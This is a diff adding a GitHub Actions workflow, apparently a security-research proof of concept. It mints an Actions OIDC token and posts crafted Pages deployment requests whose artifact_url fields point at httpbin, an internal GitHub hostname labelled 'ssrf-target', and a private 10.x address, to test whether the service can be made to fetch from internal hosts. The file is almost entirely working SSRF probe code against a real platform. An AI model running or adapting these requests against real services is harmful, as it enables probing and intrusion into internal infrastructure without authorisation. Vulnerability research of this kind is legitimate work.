@@ -1,0 +1,49 @@
+name: deployarms
+on: [workflow_dispatch]
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  arms:
+    runs-on: ubuntu-latest
+    steps:
+      - name: arms
+        shell: bash
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          AID: ${{ github.event.inputs.aid }}
+        run: |
+          set -u
+          R="${GITHUB_REPOSITORY}"
+          # mint an Actions OIDC token (this is what deploy-pages does)
+          OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+                 "$ACTIONS_ID_TOKEN_REQUEST_URL" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+          echo "ARMING GATE: oidc_token length=${#OIDC}" > /tmp/res.txt
+          if [ ${#OIDC} -lt 20 ]; then echo "*** VOID: no OIDC token minted ***" >> /tmp/res.txt; cat /tmp/res.txt; exit 0; fi
+          AID_VAL="${ARTIFACT_ID:-11929869240}"
+          arm () { # $1=label  $2=json-body
+            CODE=$(curl -sS -o /tmp/b.json -w '%{http_code}' -X POST \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -H "Content-Type: application/json" \
+              "https://api.github.com/repos/$R/pages/deployments" -d "$2")
+            echo "--- $1 -> HTTP $CODE" >> /tmp/res.txt
+            head -c 400 /tmp/b.json >> /tmp/res.txt; echo >> /tmp/res.txt
+          }
+          arm "1 PUBLIC-host url only (httpbin)" \
+            "{\"artifact_url\":\"https://httpbin.org/bytes/64\",\"pages_build_version\":\"v1\",\"oidc_token\":\"$OIDC\"}"
+          arm "2 GHNET canary url only" \
+            "{\"artifact_url\":\"https://ssrf-target.iad.github.net/x.tar\",\"pages_build_version\":\"v2\",\"oidc_token\":\"$OIDC\"}"
+          arm "3 RFC1918 literal url only" \
+            "{\"artifact_url\":\"http://10.157.12.74/x.tar\",\"pages_build_version\":\"v3\",\"oidc_token\":\"$OIDC\"}"
+          arm "4 BOTH fields: unexpired id + GHNET url" \
+            "{\"artifact_id\":$AID_VAL,\"artifact_url\":\"https://ssrf-target.iad.github.net/x.tar\",\"pages_build_version\":\"v4\",\"oidc_token\":\"$OIDC\"}"
+          arm "5 BOTH fields: unexpired id + httpbin url" \
+            "{\"artifact_id\":$AID_VAL,\"artifact_url\":\"https://httpbin.org/bytes/64\",\"pages_build_version\":\"v5\",\"oidc_token\":\"$OIDC\"}"
+          arm "6 id ONLY (positive control - should SUCCEED)" \
+            "{\"artifact_id\":$AID_VAL,\"pages_build_version\":\"v6\",\"oidc_token\":\"$OIDC\"}"
+          echo "END-ARMS" >> /tmp/res.txt
+      - name: emit
+        shell: bash
+        run: cat /tmp/res.txt
